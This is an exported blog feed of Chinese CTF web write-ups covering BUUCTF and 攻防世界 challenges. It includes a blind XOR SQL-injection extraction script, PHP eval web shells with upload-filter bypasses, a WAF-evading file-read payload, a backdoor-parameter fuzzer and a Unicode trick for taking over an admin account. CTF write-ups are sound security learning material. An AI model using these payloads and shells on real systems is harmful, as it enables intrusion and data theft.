<p>这里要用到If-Unmodified-Since<br>可以参考<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/If-Unmodified-Since" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/If-Unmodified-Since</a></p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">If-Unmodified-Since: Tue, <span class="number">22</span> Oct <span class="number">2077</span> <span class="number">20</span>:<span class="number">49</span>:<span class="number">38</span> GMT</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-Hack World</title>
    <url>/2020/01/25/BUUCTF-Hack-World/</url>
    <content><![CDATA[<h1 id="Hack-World"><a href="#Hack-World" class="headerlink" title="Hack World"></a>Hack World</h1><p>打开环境 题目提示是Php 和 sql注入<br>所以先按常规的SQL来测试一下<br><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">输入</span><br><span class="line"><span class="number">1</span> 一句骚话</span><br><span class="line"><span class="number">2</span> 一句骚话</span><br><span class="line"><span class="number">1</span>' bool(false)</span><br><span class="line"><span class="number">1</span>'# SQL Injection Checked.</span><br></pre></td></tr></table></figure><br>尝试一下：<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">联合注入：unin被过滤</span><br><span class="line">报错注入：<span class="keyword">and</span>、<span class="keyword">or</span>、updatexml被过滤</span><br><span class="line"><span class="built_in">bool</span>注入和time注入：<span class="keyword">and</span>、<span class="keyword">or</span>被过滤</span><br><span class="line">可以通过fuzz测试（模糊测试），发现哪些字符被过滤了。length为<span class="number">482</span>的，全都是被过滤的。</span><br></pre></td></tr></table></figure><br>这里没啥 思路了 但是通过bool(false)  可以判断应该是布尔盲注把 </p>
<p>看看WP<br>这里考的是异或注入：<br>1^1=0</p>
<p>1^0=1</p>
<p>另外还学到了<br><figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">利用/*!<span class="class"><span class="keyword">union</span>*/可以绕过对<span class="title">union</span>的过滤  但是这题不能用 先存着</span></span><br></pre></td></tr></table></figure></p>
<p>由于不会写脚本 所以找了个大师傅的二分脚本：<br><figure class="highlight nix"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*- </span></span><br><span class="line"><span class="built_in">import</span> requests</span><br><span class="line"><span class="built_in">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="attr">url</span> = <span class="string">"http://a5b5ef4b-d1ce-48aa-a3cf-31243ef82374.node3.buuoj.cn/index.php"</span></span><br><span class="line"><span class="attr">payload</span> = &#123;</span><br><span class="line">    <span class="string">"id"</span> : <span class="string">""</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="attr">result</span> = <span class="string">""</span></span><br><span class="line">for i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="attr">l</span> = <span class="number">33</span></span><br><span class="line">    <span class="attr">r</span> =<span class="number">130</span></span><br><span class="line">    <span class="attr">mid</span> = (l+r)&gt;&gt;<span class="number">1</span></span><br><span class="line">    while(l&lt;r):</span><br><span class="line">        payload[<span class="string">"id"</span>] = <span class="string">"0^"</span> + <span class="string">"(ascii(substr((select(flag)from(flag)),&#123;0&#125;,1))&gt;&#123;1&#125;)"</span>.format(i,mid)</span><br><span class="line">        <span class="attr">html</span> = requests.post(url,<span class="attr">data=payload)</span></span><br><span class="line">        print(payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"Hello"</span> <span class="keyword">in</span> html.text:</span><br><span class="line">            <span class="attr">l</span> = mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="attr">r</span> = mid</span><br><span class="line">        <span class="attr">mid</span> = (l+r)&gt;&gt;<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span>(chr(mid)==<span class="string">" "</span>):</span><br><span class="line">        break</span><br><span class="line">    <span class="attr">result</span> = result + chr(mid)</span><br><span class="line">    print(result)</span><br><span class="line">print(<span class="string">"flag: "</span> ,result)</span><br></pre></td></tr></table></figure></p>
<p>得到flag</p>
<p>不会写脚本 好多题都没法做 唉</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-CheckIn</title>
    <url>/2020/01/25/BUUCTF-CheckIn/</url>
    <content><![CDATA[<h1 id="CheckIn"><a href="#CheckIn" class="headerlink" title="CheckIn"></a>CheckIn</h1><p>打开环境看到是一个上传的界面 难道是一句话木马</p>
<p>上传一个一句话木马 抓包 之后更改Type 发现不行 把.php改为.png后 正常通过，看来是验证了后缀名</p>
<p>所以尝试在.php后加一个空格 再.png 成功上传</p>
<p>通过抓包 还发现过滤掉了&lt;?, 所以我们变形为<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">'php'</span>&gt;</span><span class="javascript">@<span class="built_in">eval</span>($_POST[<span class="string">'a'</span>]);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>这里没有什么思路了 去看了一下WP  有两个知识点</p>
<ol>
<li><p>.user.ini文件 <a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html" target="_blank" rel="noopener">https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html</a></p>
</li>
<li><p>GIF89a 图片头文件欺骗 <a href="https://blog.csdn.net/piaolankeke/article/details/5872876" target="_blank" rel="noopener">https://blog.csdn.net/piaolankeke/article/details/5872876</a></p>
</li>
</ol>
<p>接下来就是上传了<br><img src="/img/BUUCTF/CheckIn/0.png" alt="avatar"></p>
<p><img src="/img/BUUCTF/CheckIn/1.png" alt="avatar"></p>
<p>接下来用菜刀getshell</p>
<p>得到flag</p>
<p>这里还有一种GET型的一句话木马<br>步骤与之前差不多<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">'php'</span>&gt;</span><span class="javascript">@<span class="built_in">eval</span>($_GET[<span class="string">'a'</span>]);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><br>URL：<br>?a=system(“cat /flag”);</p>
<p>也可以得到flag</p>
<p>题目提供了源码：<br><a href="https://github.com/team-su/SUCTF-2019/tree/master/Web/checkIn" target="_blank" rel="noopener">https://github.com/team-su/SUCTF-2019/tree/master/Web/checkIn</a></p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界-lottery</title>
    <url>/2020/01/21/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-lottery/</url>
    <content><![CDATA[<h1 id="lottery"><a href="#lottery" class="headerlink" title="lottery"></a>lottery</h1><p>打开环境 看了一下题目 大概一下就是玩个游戏 只要你输入的7个数字和系统随机生成的7个数字一样 你就会获得钱  钱够了可以买flag</p>
<p>首先 访问 /robots.txt 或者 /.git/ 发现 Git 仓库可以 GitHack 拿到源码<br>漏洞在 api.php<br><figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">  <span class="symbol">$</span>money = <span class="symbol">$</span>_SESSION[<span class="string">'money'</span>];</span><br><span class="line"><span class="meta"><span class="meta-keyword">$numbers</span> = $req['numbers'];</span></span><br><span class="line"><span class="meta"><span class="meta-keyword">$win</span>_numbers = random_win_nums();</span></span><br><span class="line"><span class="meta"><span class="meta-keyword">$same</span>_count = 0;</span></span><br><span class="line"><span class="keyword">for</span>(<span class="symbol">$</span>i=<span class="number">0</span>; <span class="symbol">$</span>i&lt;<span class="number">7</span>; <span class="symbol">$</span>i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="symbol">$</span>numbers[<span class="symbol">$</span>i] == <span class="symbol">$</span>win_numbers[<span class="symbol">$</span>i])&#123;</span><br><span class="line">        <span class="symbol">$</span>same_count++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>没什么思路 注册一个账号 随便输入7个数字 抓包<br><img src="/img/攻防世界/lottery/0.png" alt="avatar"></p>
<p>使用 PHP 弱类型松散比较，以”1”为例，和TRUE,1,”1”相等<br><img src="/img/攻防世界/lottery/1.png" alt="avatar"></p>
<p>多发几次包  钱够了 买flag</p>
<p>得到flag</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-Easy Calc</title>
    <url>/2020/01/21/BUUCTF-Easy-Calc/</url>
    <content><![CDATA[<h1 id="Easy-Calc"><a href="#Easy-Calc" class="headerlink" title="Easy Calc"></a>Easy Calc</h1><p>打开环境是个计算器，搜索一下Calc是什么</p>
<p>最后发现是CSS中的一个样式，用于进行一下计算<br><a href="http://caibaojian.com/css3-calc.html" target="_blank" rel="noopener">http://caibaojian.com/css3-calc.html</a></p>
<p>尝试一下注入<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">输入</span><br><span class="line"><span class="number">1</span> 正常</span><br><span class="line"><span class="number">1</span>’ 没有报错</span><br><span class="line"><span class="number">1</span><span class="string">'# 直接给PASS了</span></span><br></pre></td></tr></table></figure><br>到这里考虑不是SQL注入题</p>
<p>crtl+u看一下源码 看到作者给了提示 写了WAF保障安全</p>
<p>WAF：<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="string">'#calc'</span>).submit(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">            url:<span class="string">"calc.php?num="</span>+<span class="built_in">encodeURIComponent</span>($(<span class="string">"#content"</span>).val()),</span><br><span class="line">            type:<span class="string">'GET'</span>,</span><br><span class="line">            success:<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">                $(<span class="string">"#result"</span>).html(<span class="string">`&lt;div class="alert alert-success"&gt;</span></span><br><span class="line"><span class="string">            &lt;strong&gt;答案:&lt;/strong&gt;<span class="subst">$&#123;data&#125;</span></span></span><br><span class="line"><span class="string">            &lt;/div&gt;`</span>);</span><br><span class="line">            &#125;,</span><br><span class="line">            error:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                alert(<span class="string">"这啥?算不来!"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure></p>
<p>$(“#content”).val()是什么意思？  百度一下得知类似于HTML中的document.getElementById(“content”); </p>
<p>再百度一下encodeURIComponent 得知是将参数进行URI编码</p>
<p>再查看一下calc.php<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $str = $_GET[<span class="string">'num'</span>];</span><br><span class="line">        $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>,<span class="string">'\$'</span>,<span class="string">'\\'</span>,<span class="string">'\^'</span>];</span><br><span class="line">        <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $str)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">"what are you want to do?"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">'echo '</span>.$str.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>根据WAF来进行绕过</p>
<p>接下来构造payload：<br>使用scandir（）返回根目录看一下<br><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">?num=<span class="number">1</span>;var<span class="constructor">_dump(<span class="params">scandir</span>(<span class="operator">/</span>)</span>);</span><br></pre></td></tr></table></figure><br>发现不行 这里没有思路了 看一下WP知道了</p>
<p>PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：1.删除空白符  2.将某些字符转换为下划线（包括空格）【当waf不让你过的时候，php却可以让你过】</p>
<p>所以在num变量前加个空格来让WAF识别不到  并且用char()进行转义<br><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">? num=<span class="number">1</span>;var<span class="constructor">_dump(<span class="params">scandir</span>(<span class="params">chr</span>(47)</span>))</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/BUUCTF/Easy_Calc/0.png" alt="avatar"></p>
<p>找到flagg目录</p>
<p>那就继续读取 使用file_get_contents<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">? num=<span class="number">1</span>;var_dump(file_get_contents(chr(<span class="number">47</span>).chr(<span class="number">102</span>).chr(<span class="number">49</span>).chr(<span class="number">97</span>).chr(<span class="number">103</span>).chr(<span class="number">103</span>)))</span><br></pre></td></tr></table></figure></p>
<p>得到flag</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界-ics-06</title>
    <url>/2020/01/20/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-ics-06/</url>
    <content><![CDATA[<h1 id="ics-06"><a href="#ics-06" class="headerlink" title="ics-06"></a>ics-06</h1><p>进去之后感觉没有什么可以做的地方<br>用御剑扫描一下<br><img src="/img/攻防世界/ics-06/0.png" alt="avatar"></p>
<p>找到一个index.html  访问一下<br><img src="/img/攻防世界/ics-06/1.png" alt="avatar"></p>
<p>送分题？</p>
<p>看了一下URL 有id=1</p>
<p>打开bp 爆破一下 因为是数字 所以用python写一个字典出来<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> range (<span class="number">10001</span>):</span><br><span class="line">    print(m)</span><br></pre></td></tr></table></figure><br>直接爆破<br><img src="/img/攻防世界/ics-06/2.png" alt="avatar"></p>
<p>id=2333 改一下 然后发包<br><img src="/img/攻防世界/ics-06/3.png" alt="avatar"></p>
<p>得到flag</p>
<p>真·送分题</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-高明的黑客</title>
    <url>/2020/01/20/BUUCTF-%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/</url>
    <content><![CDATA[<h1 id="高明的黑客"><a href="#高明的黑客" class="headerlink" title="高明的黑客"></a>高明的黑客</h1><p>打开之后得到一个提示源代码存在了www.tar.gz</p>
<p>当时比赛的时候遇到这个题，还一直脑残的以为是某个网站，哭了<br>直接URL访问之后，会下载到源码<br><a href="http://c9d08f8b-8738-4265-a7ec-e5f223c985cf.node3.buuoj.cn/www.tar.gz" target="_blank" rel="noopener">http://c9d08f8b-8738-4265-a7ec-e5f223c985cf.node3.buuoj.cn/www.tar.gz</a></p>
<p>下载好了之后推测是个压缩包之类的，搜一下gz后缀，果然是常见于Linux和MacOS下的压缩包格式，直接7-zip解压</p>
<p>发现有个src的文件，里面有很多杂乱的PHP文件，随便打开一个试试<br>发现读不太懂，但是像$_GET eval echo等还是有的</p>
<p>这里就没有什么思路了，所以看了一下官方WP，找了一个爆破脚本遍历GET并传一些参数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*- </span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> concurrent.futures.thread <span class="keyword">import</span> ThreadPoolExecutor</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line">path = <span class="string">"D:\phpStudy\phpStudy\PHPTutorial\WWW\src"</span>  <span class="comment"># 文件夹目录</span></span><br><span class="line">files = os.listdir(path)  <span class="comment"># 得到文件夹下的所有文件名称</span></span><br><span class="line"></span><br><span class="line">mutex = threading.Lock()</span><br><span class="line">pool = ThreadPoolExecutor(max_workers=<span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_file</span><span class="params">(file)</span>:</span></span><br><span class="line">    print(<span class="string">'finding...'</span>)</span><br><span class="line">    f = open(path + <span class="string">"/"</span> + file);  <span class="comment"># 打开文件</span></span><br><span class="line">    iter_f = iter(f);  <span class="comment"># 创建迭代器</span></span><br><span class="line">    str = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> iter_f:  <span class="comment"># 遍历文件，一行行遍历，读取文本</span></span><br><span class="line">        str = str + line</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取一个页面内所有参数</span></span><br><span class="line">    start = <span class="number">0</span></span><br><span class="line">    params = &#123;&#125;</span><br><span class="line">    <span class="keyword">while</span> str.find(<span class="string">"$_GET['"</span>, start) != <span class="number">-1</span>:</span><br><span class="line">        pos2 = str.find(<span class="string">"']"</span>, str.find(<span class="string">"$_GET['"</span>, start) + <span class="number">1</span>)</span><br><span class="line">        var = str[str.find(<span class="string">"$_GET['"</span>, start) + <span class="number">7</span>: pos2]</span><br><span class="line">        start = pos2 + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        params[var] = <span class="string">'echo("glzjin");'</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># print(var)</span></span><br><span class="line"></span><br><span class="line">    start = <span class="number">0</span></span><br><span class="line">    data = &#123;&#125;</span><br><span class="line">    <span class="keyword">while</span> str.find(<span class="string">"$_POST['"</span>, start) != <span class="number">-1</span>:</span><br><span class="line">        pos2 = str.find(<span class="string">"']"</span>, str.find(<span class="string">"$_POST['"</span>, start) + <span class="number">1</span>)</span><br><span class="line">        var = str[str.find(<span class="string">"$_POST['"</span>, start) + <span class="number">8</span>: pos2]</span><br><span class="line">        start = pos2 + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        data[var] = <span class="string">'echo("glzjin");'</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># print(var)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># eval test</span></span><br><span class="line">    r = session.post(<span class="string">'http://localhost/src/'</span> + file, data=data, params=params)</span><br><span class="line">    <span class="keyword">if</span> r.text.find(<span class="string">'glzjin'</span>) != <span class="number">-1</span>:</span><br><span class="line">        mutex.acquire()</span><br><span class="line">        print(file + <span class="string">" found!"</span>)</span><br><span class="line">        mutex.release()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># assert test</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> params:</span><br><span class="line">        params[i] = params[i][:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        data[i] = data[i][:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">    r = session.post(<span class="string">'http://localhost/src/'</span> + file, data=data, params=params)</span><br><span class="line">    <span class="keyword">if</span> r.text.find(<span class="string">'glzjin'</span>) != <span class="number">-1</span>:</span><br><span class="line">        mutex.acquire()</span><br><span class="line">        print(file + <span class="string">" found!"</span>)</span><br><span class="line">        mutex.release()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># system test</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> params:</span><br><span class="line">        params[i] = <span class="string">'echo glzjin'</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        data[i] = <span class="string">'echo glzjin'</span></span><br><span class="line"></span><br><span class="line">    r = session.post(<span class="string">'http://localhost/src/'</span> + file, data=data, params=params)</span><br><span class="line">    <span class="keyword">if</span> r.text.find(<span class="string">'glzjin'</span>) != <span class="number">-1</span>:</span><br><span class="line">        mutex.acquire()</span><br><span class="line">        print(file + <span class="string">" found!"</span>)</span><br><span class="line">        mutex.release()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># print("====================")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_file</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> file <span class="keyword">in</span> files:  <span class="comment"># 遍历文件夹</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.isdir(file):  <span class="comment"># 判断是否是文件夹，不是文件夹才打开</span></span><br><span class="line">            <span class="comment"># read_file(file)</span></span><br><span class="line"></span><br><span class="line">            pool.submit(read_file, file)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_param</span><span class="params">(fileName)</span>:</span></span><br><span class="line">    url = <span class="string">"http://localhost/src/"</span></span><br><span class="line">    f = open(path+<span class="string">'/'</span>+fileName, <span class="string">'r'</span>, encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">    content = f.read()</span><br><span class="line">    m = re.findall(<span class="string">"\$_(GET|POST)\['(.+?)'\]"</span>, content)</span><br><span class="line">    <span class="keyword">if</span> m:</span><br><span class="line">        <span class="keyword">for</span> seq <span class="keyword">in</span> m:</span><br><span class="line">            print(<span class="string">'finding...'</span>)</span><br><span class="line">            method = seq[<span class="number">0</span>]</span><br><span class="line">            param = seq[<span class="number">1</span>]</span><br><span class="line">            payload = <span class="string">''</span></span><br><span class="line">            payload += <span class="string">'?'</span></span><br><span class="line">            payload += param</span><br><span class="line">            payload += <span class="string">"="</span></span><br><span class="line">            payload += <span class="string">"echo glzjin"</span></span><br><span class="line">            res = requests.get(url + fileName + payload)</span><br><span class="line">            n = re.findall(<span class="string">'glzjin'</span>, res.text)</span><br><span class="line">            <span class="keyword">if</span> n:</span><br><span class="line">                print(<span class="string">'found!'</span>)</span><br><span class="line">                print(fileName, method, param, <span class="string">"found!"</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">elif</span> method == <span class="string">'POST'</span>:</span><br><span class="line">                postData = &#123; param: <span class="string">"echo glzjin'"</span> &#125;</span><br><span class="line">                res = requests.post(url + fileName, data=postData)</span><br><span class="line">                n = re.findall(<span class="string">'glzjin'</span>, res.text)</span><br><span class="line">                <span class="keyword">if</span> n:</span><br><span class="line">                    print(fileName, method, param, <span class="string">"found!"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment">#find_file()</span></span><br><span class="line">    find_param(<span class="string">'xk0SzyKwfzw.php'</span>)</span><br></pre></td></tr></table></figure>
<p>在运行脚本之前需要启动PHP环境 并根据自己的路径进行相应的修改<br><img src="/img/BUUCTF/高明的黑客/0.png" alt="avatar"></p>
<p>成功找到</p>
<p>去这个文件去看看<br><img src="/img/BUUCTF/高明的黑客/1.png" alt="avatar"><br>这个部分很关键</p>
<p>接下来就构造payload:<br><a href="http://c9d08f8b-8738-4265-a7ec-e5f223c985cf.node3.buuoj.cn/xk0SzyKwfzw.php?Efa5BVG=cat%20/flag" target="_blank" rel="noopener">http://c9d08f8b-8738-4265-a7ec-e5f223c985cf.node3.buuoj.cn/xk0SzyKwfzw.php?Efa5BVG=cat%20/flag</a></p>
<p>得到flag</p>
<p>感觉不是太懂官方这个WP 为什么说那一段代码很关键 我表示一脸懵逼看不出来<br>后面又找了一篇WP，看了一下，大概就是该后门的密码之类的<br>可以参考一下：<br><a href="https://www.cnblogs.com/chrysanthemum/p/11717337.html" target="_blank" rel="noopener">https://www.cnblogs.com/chrysanthemum/p/11717337.html</a></p>
<p>另外官方的脚本感觉就像已经知道了是哪个文件 特定也出来的 速度非常快 可能这就是出题人自己写WP的弊病吧 建议采用一下上面这篇文章里的脚本 虽然很慢 但是有那种爆破的感觉了 而不是直接输出是哪个文件</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-admin</title>
    <url>/2020/01/18/BUUCTF-admin/</url>
    <content><![CDATA[<h1 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h1><p>打开环境，再根据题目，可以猜测大概是伪造admin登录就OK了<br>没有什么思路 先随便注册一个吧<br>登录之后，点change password  查看一下源码<br>得到hint<br><img src="/img/BUUCTF/admin/0.png" alt="avatar"></p>
<p>又又又又是flask  我要吐了</p>
<p>复制连接 下载一下</p>
<p>随后打开index.php 查看代码</p>
<p>flask之前比赛时遇到过，CNSS也遇到过，一个轻量级的python框架，这题有两种解法，一种是session  写脚本就可以直接得到 但是奈何不会写</p>
<p>所以只好使用strlower  转小写函数去尝试注册ADMIN<br>哦豁，发现GG了，那再看看strlower的定义中有nodeprep.prepare()这个函数<br>我们先使用unicode编码的字符 ᴬ<br>用这个用户名注册<br><figure class="highlight excel"><table><tr><td class="code"><pre><span class="line">ᴬ<span class="built_in">dmin</span></span><br></pre></td></tr></table></figure><br>这个时候nodeprep.prepare()函数会将用户名变为Admin，随便修改一下密码，就会再次调用该函数变为admin</p>
<p>这个时候其实已经覆写了admin的密码 直接登录</p>
<p>得到flag</p>
<p>这里是利用了unicode的编码问题<br>可以参考一下：<br><a href="https://unicode-table.com/en/blocks/phonetic-extensions/" target="_blank" rel="noopener">https://unicode-table.com/en/blocks/phonetic-extensions/</a></p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-EasySQL 1</title>
    <url>/2020/01/18/BUUCTF-EasySQL-1/</url>
    <content><![CDATA[<h1 id="EasySQL-1"><a href="#EasySQL-1" class="headerlink" title="EasySQL 1"></a>EasySQL 1</h1><p>题目得到是SQL注入，那就直接上手，先按常规的来：<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">输入</span><br><span class="line"><span class="number">1</span> 返回数据</span><br><span class="line"><span class="number">1</span><span class="string">' 没有返回数据  看来不需要'</span></span><br><span class="line"><span class="number">1</span>;  正常返回</span><br><span class="line"><span class="number">1</span>; show databases;  和前面学到的堆叠一样的原理</span><br><span class="line"><span class="number">1</span>; show tables;  Array ( [<span class="number">0</span>] =&gt; Flag )</span><br></pre></td></tr></table></figure><br>接下来就没有头绪了，看了一下WP，感觉大佬说的听不太懂<br><figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line"><span class="built_in">select</span> $<span class="variable">_GET</span>[<span class="string">'query'</span>] || <span class="built_in">flag</span> <span class="keyword">from</span> <span class="built_in">flag</span></span><br></pre></td></tr></table></figure><br>这是内嵌的select</p>
<p>输入的参数都传给了query，所以只要query为1，即为真，就返回flag</p>
<p>但是我真的很想知道这个内嵌是怎么看出来的，唉，还是太菜了</p>
<p>最后输入<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">*,<span class="number">1</span></span><br></pre></td></tr></table></figure><br>得到flag</p>
<p>最后这个输入进去，按照刚才的拼接，后台的代码呈现的应该是：<br><figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line"><span class="built_in">select</span> *,<span class="number">1</span> || <span class="built_in">flag</span> <span class="keyword">from</span> <span class="built_in">flag</span></span><br></pre></td></tr></table></figure><br>大佬们还是太强了</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-easy_tornado 1</title>
    <url>/2020/01/18/BUUCTF-easy-tornado-1/</url>
    <content><![CDATA[<h1 id="easy-tornado-1"><a href="#easy-tornado-1" class="headerlink" title="easy_tornado 1"></a>easy_tornado 1</h1><p>打开环境就看到三个链接，依次打开得到：<br>flag in /fllllllllllllag</p>
<p>render</p>
<p>md5(cookie_secret+md5(filename))</p>
<p>目前看来只有第一个和第三个有用<br>flag在/fllllllllllllag目录下<br>用到了md5</p>
<p>我觉得cookie_secret有点东西，百度了一下果然发现了题目<br><a href="https://www.cnblogs.com/liyqiang/p/7140530.html" target="_blank" rel="noopener">https://www.cnblogs.com/liyqiang/p/7140530.html</a></p>
<p>emmmm 貌似tornado是python的一个框架，python还木有学，太尴尬了<br>只好查资料，最后得到：<br>render好像是个渲染函数之类的</p>
<p>先随便看看：<br>尝试一下文件包含</p>
<p><img src="/img/BUUCTF/tornado/0.png" alt="avatar"></p>
<p>返回了错误界面，没有思路了，只好看看大佬的WP，存在模板注入；<br>Tornado可以参考这里：<br><a href="https://www.cnblogs.com/bwangel23/p/4858870.html" target="_blank" rel="noopener">https://www.cnblogs.com/bwangel23/p/4858870.html</a></p>
